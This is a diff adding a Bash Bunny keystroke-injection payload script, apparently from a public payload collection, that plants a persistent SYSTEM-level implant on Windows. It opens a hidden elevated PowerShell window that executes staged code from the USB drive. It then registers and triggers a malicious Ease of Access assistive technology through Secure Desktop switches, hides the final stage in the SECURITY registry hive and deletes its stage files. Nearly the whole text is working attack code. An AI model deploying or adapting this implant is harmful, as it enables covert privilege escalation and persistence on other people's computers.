@@ -1,0 +1,86 @@
+#!/bin/bash
+#
+# Title:         ATNT : Persistent NT AUTHORITY\SYSTEM implant
+# Description:   Uses Windows Ease of Access Assistive Technology (https://docs.microsoft.com/en-us/windows/win32/winauto/ease-of-access---assistive-technology-registration)
+#                To persistently run code with NT AUTHORITY\SYSTEM rights.
+# Author:        9o3
+# Twitter:       @BugBot4
+# Version:       1.0
+# Category:      Execution
+# Attackmodes:   HID, Storage
+#
+# LED STATUS
+# ==========
+# SETUP.......Generate stage files
+# STAGE1......Run hidden elevated PowerShell window that creates the AT
+# STAGE2......Trigger the newly created AT
+# STAGE3......Update the newly created AT to run the final stage
+# STAGE4......(OPTIONAL) Trigger the updated AT to run the final stage
+# CLEANUP.....Remove generated files
+# FINISH......Finished
+#
+# OPTIONS
+# =======
+# Final stage configured from included final_stage.ps1 script
+# run_final_stage => Setting this to false will instead trigger the final stage when the user switches to a Secure Desktop
+run_final_stage=true
+
+LED SETUP
+GET SWITCH_POSITION
+cd /root/udisk/payloads/
+cd $SWITCH_POSITION
+sed "s/!SWITCH!/$SWITCH_POSITION/g" stage2.ps1 > 2
+sed '/!FINAL_STAGE!/{
+	s/!FINAL_STAGE!//g
+	r final_stage.ps1
+}' stage3.ps1 > 3
+
+ATTACKMODE HID STORAGE
+
+######## Run hidden elevated PowerShell window ########
+# Runs hidden elevated powershell which executes stage2.ps1
+LED STAGE1
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING "powershell -w 1 -NoP iex(gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\2')-Raw)"
+QUACK DELAY 200
+QUACK CTRL-SHIFT ENTER
+QUACK DELAY 750
+QUACK LEFTARROW
+QUACK DELAY 100
+QUACK ENTER
+
+######## Trigger the newly created AT ########
+# ATs are tirggered by a desktop switch. Secure Desktops launch ATs as NT AUTHORITY\SYSTEM
+# The AT gets and executes stage3.ps1
+LED STAGE2
+QUACK DELAY 1000
+QUACK CTRL-ALT DEL
+QUACK DELAY 750
+QUACK ESC
+
+######## Update the newly created AT ########
+# Write the content of final_stage.ps1 to the SECURITY hive, which is only readable as NT AUTHORITY\SYSTEM
+# Updates the newly created AT to read and execute the final stage from the SECURITY hive
+LED STAGE3
+until [ -f /root/udisk/DONE ]
+do
+	sleep 0.2
+done
+if [ "$run_final_stage" = true ] ; then
+	######## Trigger the updated AT ########
+	# Trigger the updated AT as NT AUTHORITY\SYSTEM and execute the final stage
+	LED STAGE4
+	QUACK CTRL-ALT DEL
+	QUACK DELAY 750
+	QUACK ESC  
+fi
+
+######## Remove generated files ########
+# Removes the generated stages and the DONE file used to indicate the end of the third stage
+LED CLEANUP
+rm /root/udisk/DONE
+rm 2
+rm 3
+sync
+LED FINISH
